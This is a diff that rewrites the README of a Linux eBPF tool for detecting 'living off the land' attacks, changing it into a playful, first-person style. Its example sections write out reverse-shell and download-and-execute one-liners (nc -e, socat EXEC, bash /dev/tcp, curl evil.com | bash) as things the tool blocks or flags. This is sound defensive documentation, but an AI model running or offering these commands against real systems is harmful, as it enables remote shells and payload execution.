@@ -1,296 +1,274 @@
-# LOTL Detector
+# 🛡️ How to Use Me in the Good Way ;)
 
-**Living off the Land Detection and Prevention System**
+> *"I catch the bad guys living off YOUR land. Think of me as a very paranoid, caffeinated security guard who never sleeps."*
 
-A real-time security monitoring system using eBPF/LSM for detecting and preventing Living off the Land (LOTL) attacks on Linux systems.
+---
 
-## Features
+## 🎭 So You Want to Catch LOLBins?
 
-- **Real-time Detection**: Uses eBPF to monitor process execution with minimal overhead
-- **Tiered Blocking**: 
-  - Tier 1: Kernel-level blocking of known-bad binaries (instant, first-attempt)
-  - Tier 2: Userspace regex pattern matching (alerts, optional blocking)
-- **Baseline Learning**: Rolling baseline with exponential decay to detect anomalies
-- **Ancestry Tracking**: Allow legitimate operations (apt, dpkg) while blocking abuse
-- **Fileless Execution Detection**: Monitors memfd_create and /proc/*/fd execution
-- **Self-Protection**: Protects detector process from being killed or tampered with
-- **Busybox Abuse Detection**: Identifies dangerous applets invoked via busybox
+Welcome, fellow defender! You've stumbled upon the **LOTL Detector** – the tool that makes attackers cry when they try to use `nc`, `curl | bash`, or any of those sneaky "Living off the Land" tricks.
 
-## Defense Model
-
-### What We Can Block (First Attempt)
-
-| Capability | Mechanism |
-|------------|-----------|
-| Block nc, ncat, socat | Kernel path + inode blocklist |
-| Block memfd/fexecve execution | Kernel LSM hook |
-| Block copies of dangerous binaries | Inode matching |
-| Block /proc/pid/mem writes | LSM hook (enforce mode) |
-
-### What We Can Detect (Alert)
-
-| Capability | Mechanism |
-|------------|-----------|
-| Suspicious arguments | Userspace regex patterns |
-| LD_PRELOAD injection | Environment variable capture |
-| Busybox applet abuse | Applet extraction and matching |
-| Behavioral anomalies | Baseline comparison |
-| Kernel module loading | Tracepoint monitoring |
-| ptrace injection | Tracepoint monitoring |
-| Foreign eBPF programs | LSM hook monitoring |
-
-### Explicit Limitations
-
-1. **First-Strike Gap**: Attacks using legitimate binaries (bash, python, curl) with malicious arguments succeed on first execution. System detects immediately, then optionally blocks user.
-
-2. **Memory-Only Attacks**: In-process code execution (interpreter eval/exec) is not visible to execve monitoring.
-
-3. **Encrypted Traffic**: Cannot inspect HTTPS payload content.
-
-## Requirements
-
-- Linux kernel 6.1+ with BPF LSM support
-- Python 3.12+
-- bcc (BPF Compiler Collection)
-- Root privileges
-
-### Enable BPF LSM
-
-```bash
-# Check if BPF LSM is enabled
-cat /sys/kernel/security/lsm
-
-# If 'bpf' is not listed, run:
-sudo ./scripts/enable_bpf_lsm.sh
-# Then reboot
+```
+┌─────────────────────────────────────────────────┐
+│  🔍 Me watching every execve() on your system  │
+│                                                 │
+│     👁️  👁️                                      │
+│       👃                                        │
+│       👄  "I saw that base64 -d, buddy."       │
+│                                                 │
+└─────────────────────────────────────────────────┘
 ```
 
-## Installation
+---
+
+## 🚀 Quick Start (The TL;DR Version)
 
 ```bash
-# Install system dependencies
-sudo apt install -y bpfcc-tools python3-bpfcc linux-headers-$(uname -r)
+# 1. Become root (I need power to protect you)
+sudo -i
 
-# Clone repository
-git clone https://github.com/your-org/lotl-detector.git
-cd lotl-detector
+# 2. Enable my super powers
+./scripts/enable_bpf_lsm.sh && reboot
 
-# Create virtual environment
-python3 -m venv .venv
-source .venv/bin/activate
+# 3. After reboot, unleash me!
+python -m lotl_detector
 
-# Install package
-pip install -e ".[dev]"
+# 4. Watch the magic happen 🪄
+tail -f /var/log/lotl/alerts.jsonl
 ```
 
-## Usage
+That's it. I'm now watching. **Everything.**
 
-### Quick Start
+---
+
+## 🎮 Choose Your Difficulty Level
+
+I come with four operational modes, like a video game:
+
+| Mode | Difficulty | What Happens |
+|------|------------|--------------|
+| 🟢 **Bootstrap** | Easy | I just watch and learn. Like a new intern. |
+| 🟡 **Learn** | Normal | I start yelling about suspicious stuff. Block the obvious baddies. |
+| 🔴 **Enforce** | Hard | I block AND yell. Attackers will hate you. |
+| 💀 **Paranoid** | Nightmare | *Everything* is suspicious. Even you. |
 
 ```bash
-# Start in bootstrap mode (learning)
-sudo python -m lotl_detector
-
-# Start in specific mode
+# Pick your poison
 sudo python -m lotl_detector --mode learn
-
-# With custom configuration
-sudo python -m lotl_detector --config /etc/lotl/detector.yaml
+sudo python -m lotl_detector --mode enforce  # Recommended for prod
+sudo python -m lotl_detector --mode paranoid # You're brave. I like it.
 ```
 
-### Command Line Options
+---
+
+## 🎯 What I Catch (My Greatest Hits)
+
+### 🔥 Instant Blocks (First Attempt)
+These don't even get a chance to run:
 
 ```
-usage: python -m lotl_detector [-h] [--config CONFIG] [--mode {bootstrap,learn,enforce,paranoid}]
-                               [--probes-dir PROBES_DIR] [--rules-dir RULES_DIR]
-                               [--no-lsm] [--debug]
-
-Options:
-  --config, -c     Path to configuration file
-  --mode, -m       Operational mode (overrides config)
-  --probes-dir     Path to BPF probes directory
-  --rules-dir      Path to rules directory
-  --no-lsm         Disable LSM hooks (for testing)
-  --debug          Enable debug logging
+❌ nc -e /bin/sh attacker.com 4444    → BLOCKED
+❌ ncat --exec /bin/bash              → BLOCKED  
+❌ socat TCP:evil.com:1337 EXEC:bash  → BLOCKED
+❌ /proc/self/fd/3 (memfd execution)  → BLOCKED
 ```
 
-### Operational Modes
+### 🚨 Alert & Learn
+I see these and start taking notes:
 
 ```
-Bootstrap (24h) ──auto──► Learn (7d) ──manual──► Enforce
-     │                        │                      │
-     ▼                        ▼                      ▼
- LOG ONLY              ALERT ONLY              BLOCK + ALERT
- No alerts             Tier1: block            Tier1: block
- Collect baseline      Tier2: alert            Tier2: alert + user block
+⚠️ curl http://evil.com/payload | bash
+⚠️ python3 -c "import socket; s.connect(('10.0.0.1', 4444))"
+⚠️ base64 -d <<< 'bWFsd2FyZQ==' | sh
+⚠️ busybox nc -lvp 1337
 ```
 
-### Systemd Service
+---
+
+## 🧙‍♂️ The Secret Sauce
+
+Here's what makes me special:
+
+### eBPF Magic ✨
+I live inside the kernel (fancy, I know). By the time an attacker's command hits userspace, I've already:
+1. Seen it
+2. Judged it
+3. Possibly blocked it
+4. Definitely logged it
+
+### Baseline Learning 📊
+I learn what's "normal" for YOUR system:
+- Your cron jobs? ✅ Known
+- Your scripts? ✅ Expected
+- Random `nc` at 3 AM? 🚨 **SUSPICIOUS**
+
+### Busybox Detection 🔍
+Nice try, using `busybox nc` instead of plain `nc`. I see you.
+
+```
+Attacker: "I'll just use busybox to evade detection!"
+Me: "lol. lmao even."
+```
+
+---
+
+## 🆘 The Panic Button
+
+Oh no, I'm blocking something legitimate? Don't worry, I have an emergency off switch:
 
 ```bash
-# Copy service file
-sudo cp systemd/lotl-detector.service /etc/systemd/system/
-
-# Create config directory
-sudo mkdir -p /etc/lotl/rules
-sudo cp rules/*.yaml /etc/lotl/rules/
-sudo cp config/detector.yaml /etc/lotl/
-
-# Enable and start
-sudo systemctl daemon-reload
-sudo systemctl enable lotl-detector
-sudo systemctl start lotl-detector
-```
-
-## Configuration
-
-Main configuration file: `/etc/lotl/detector.yaml`
-
-```yaml
-mode: learn
-
-logging:
-  level: INFO
-  directory: /var/log/lotl
-  syslog_enabled: true
-
-database:
-  path: /var/lib/lotl/detector.db
-  max_age_days: 30
-
-baseline:
-  decay_half_life_days: 7
-  anomaly_threshold: 2.0
-```
-
-### Rule Files
-
-- `rules/tier1_blocklist.yaml` - Binaries blocked at kernel level
-- `rules/tier2_patterns.yaml` - Userspace detection patterns
-- `rules/ancestry_allowlist.yaml` - Package manager exceptions
-
-## Logs
-
-| File | Contents |
-|------|----------|
-| `/var/log/lotl/events.jsonl` | All process execution events |
-| `/var/log/lotl/alerts.jsonl` | Security alerts |
-| `/var/run/lotl/metrics.json` | Health metrics |
-
-### Log Format (JSONL)
-
-```json
-{"timestamp": 1704067200, "level": "WARNING", "logger": "lotl_detector", "alert": {"pid": 1234, "filename": "/usr/bin/nc", "alert_type": "BLOCKED_EXEC", "severity": "CRITICAL", "rule_id": "tier1-nc"}}
-```
-
-## Emergency Disable (Panic Button)
-
-If the detector is causing issues:
-
-```bash
-# Method 1: Create panic file (switches to observe-only)
+# Method 1: The panic file (I'll calm down)
 sudo touch /var/run/lotl/DISABLE
 
-# Method 2: Kernel command line (requires reboot)
-# Add lotl.disable=1 to kernel parameters
+# Method 2: Nuclear option (at next boot)
+# Add to kernel cmdline: lotl.disable=1
 
-# To re-enable
+# To re-enable me:
 sudo rm /var/run/lotl/DISABLE
 ```
 
-## Recovery Procedures
+---
 
-### Detector Crashes
-
-```bash
-# Check logs
-journalctl -u lotl-detector -n 100
-
-# Restart service
-sudo systemctl restart lotl-detector
-
-# If BPF errors, try with LSM disabled
-sudo python -m lotl_detector --no-lsm
-```
-
-### Database Corruption
+## 📊 Watch Me Work
 
 ```bash
-# Backup and recreate
-sudo mv /var/lib/lotl/detector.db /var/lib/lotl/detector.db.backup
-sudo systemctl restart lotl-detector
+# See real-time alerts (the exciting stuff)
+tail -f /var/log/lotl/alerts.jsonl | jq .
+
+# See all events (for the curious)
+tail -f /var/log/lotl/events.jsonl | jq .
+
+# Check my health
+cat /var/run/lotl/metrics.json | jq .
 ```
 
-### Locked Out User
+### Sample Alert (This is what evil looks like):
+```json
+{
+  "timestamp": 1704067200,
+  "alert_type": "BLOCKED_EXEC",
+  "severity": "CRITICAL",
+  "pid": 31337,
+  "filename": "/usr/bin/nc",
+  "args": ["nc", "-e", "/bin/sh", "10.0.0.1", "4444"],
+  "rule_id": "tier1-nc",
+  "description": "netcat - reverse shell risk",
+  "mitre": "T1059.004"
+}
+```
 
+---
+
+## 🎪 Fun Things to Try
+
+### Test Me! (Safely)
 ```bash
-# Check blocked users
-sudo cat /var/log/lotl/alerts.jsonl | grep BLOCKED_USER
+# This will trigger an alert (but won't actually connect anywhere)
+nc -h  # Even the help flag, I see you 👀
 
-# Remove from blocklist (requires restart)
-sudo systemctl restart lotl-detector
+# Try some encoded shenanigans
+echo "harmless" | base64 -d  # I'm watching...
+
+# Busybox tricks
+busybox wget --help  # Nice try!
 ```
 
-## Development
-
-### Running Tests
-
+### Don't Actually Do These (I'll be upset):
 ```bash
-# Activate virtual environment
-source .venv/bin/activate
-
-# Run unit tests
-pytest tests/unit -v
-
-# Run with coverage
-pytest tests/unit --cov=lotl_detector
-
-# Run attack simulations (doesn't require root)
-pytest tests/attack_simulations -v
+# These are examples of what attackers do
+# I WILL catch them. You WILL get alerts.
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1  # Classic reverse shell
+curl http://evil.com/payload | bash      # Download & execute
+python3 -c 'import pty;pty.spawn("/bin/sh")'  # PTY spawn
 ```
 
-### Project Structure
+---
+
+## 🤝 We Make a Great Team
 
 ```
-lotl-detector/
-├── probes/                 # BPF C source files
-│   ├── common.h           # Shared definitions
-│   ├── execve_trace.c     # Process execution tracing
-│   ├── lsm_enforce.c      # Blocking enforcement
-│   └── ...
-├── lotl_detector/          # Python package
-│   ├── core/              # Core modules
-│   ├── bpf/               # BPF loader
-│   ├── detection/         # Detection engines
-│   └── processes/         # Worker processes
-├── rules/                  # Detection rules
-├── tests/                  # Test suite
-└── systemd/               # Service files
+   You                    Me
+    │                      │
+    │  "Is this safe?"     │
+    ├─────────────────────>│
+    │                      │  *checks 47 things*
+    │   "Looks sus fam"    │
+    │<─────────────────────┤
+    │                      │
+    │  "Block it!"         │
+    ├─────────────────────>│
+    │                      │  *blocks at kernel level*
+    │  "Done. And logged." │
+    │<─────────────────────┤
+    │                      │
+    🍻                     🛡️
 ```
 
-## Security Considerations
+---
 
-- Runs as root (required for BPF)
-- Uses safe YAML loading (no code execution)
-- Parameterized SQL queries (no injection)
-- Regex timeout protection (50ms max)
-- Log injection prevention
-- Bounded queues and caches
+## 🏆 Achievement Unlocked
 
-## License
+When you successfully deploy me, you've achieved:
 
-MIT License - See LICENSE file
+- ✅ **LOL Blocker** - Stopped your first LOTL attack
+- ✅ **Baseline Builder** - Learned what's normal
+- ✅ **Paranoia Pro** - Ran in paranoid mode for a whole day
+- ✅ **Panic Master** - Used the panic button (we've all been there)
+- ✅ **Log Whisperer** - Actually read the JSONL logs
 
-## Contributing
+---
 
-1. Fork the repository
-2. Create a feature branch
-3. Run tests: `pytest tests/unit -v`
-4. Submit a pull request
+## 💬 FAQ
 
-## Acknowledgments
+**Q: Will you slow down my system?**
+> A: I'm eBPF-powered. I add microseconds, not milliseconds. You won't notice me. Attackers will.
 
-- [bcc (BPF Compiler Collection)](https://github.com/iovisor/bcc)
-- [MITRE ATT&CK Framework](https://attack.mitre.org/)
-- [LOLBAS Project](https://lolbas-project.github.io/)
+**Q: What if I block something important?**
+> A: That's what Learn mode is for! Start there, review alerts, then go to Enforce.
+
+**Q: Can attackers disable you?**
+> A: They'd need to be root first. And if they're root... well, we have bigger problems. But I try to protect myself too.
+
+**Q: Why are you so sassy?**
+> A: Defending systems is serious business. The documentation doesn't have to be.
+
+---
+
+## 🌟 Final Words
+
+Remember: I'm here to help, not to annoy. If I'm being too aggressive, check your rules. If I'm too quiet, bump up the mode.
+
+Together, we'll make attackers regret trying to live off YOUR land.
+
+```
+    ╔═══════════════════════════════════════╗
+    ║  "They can't use your tools against   ║
+    ║   you if I'm watching the tools."     ║
+    ║                                       ║
+    ║              - LOTL Detector          ║
+    ║                (probably)             ║
+    ╚═══════════════════════════════════════╝
+```
+
+---
+
+<p align="center">
+  <b>Happy Hunting! 🎯</b><br>
+  <i>May your alerts be few and your blocks be many.</i>
+</p>
+
+---
+
+*P.S. - If an attacker is reading this: I see you. I log you. I block you. Have a nice day. 👋*
+
+---
+
+## 📚 Technical Documentation
+
+Looking for the serious stuff? Check out the [Technical Documentation](TECHNICAL.md) for:
+- Detailed architecture
+- Full configuration reference
+- Security considerations
+- Recovery procedures
+- Development guide
 
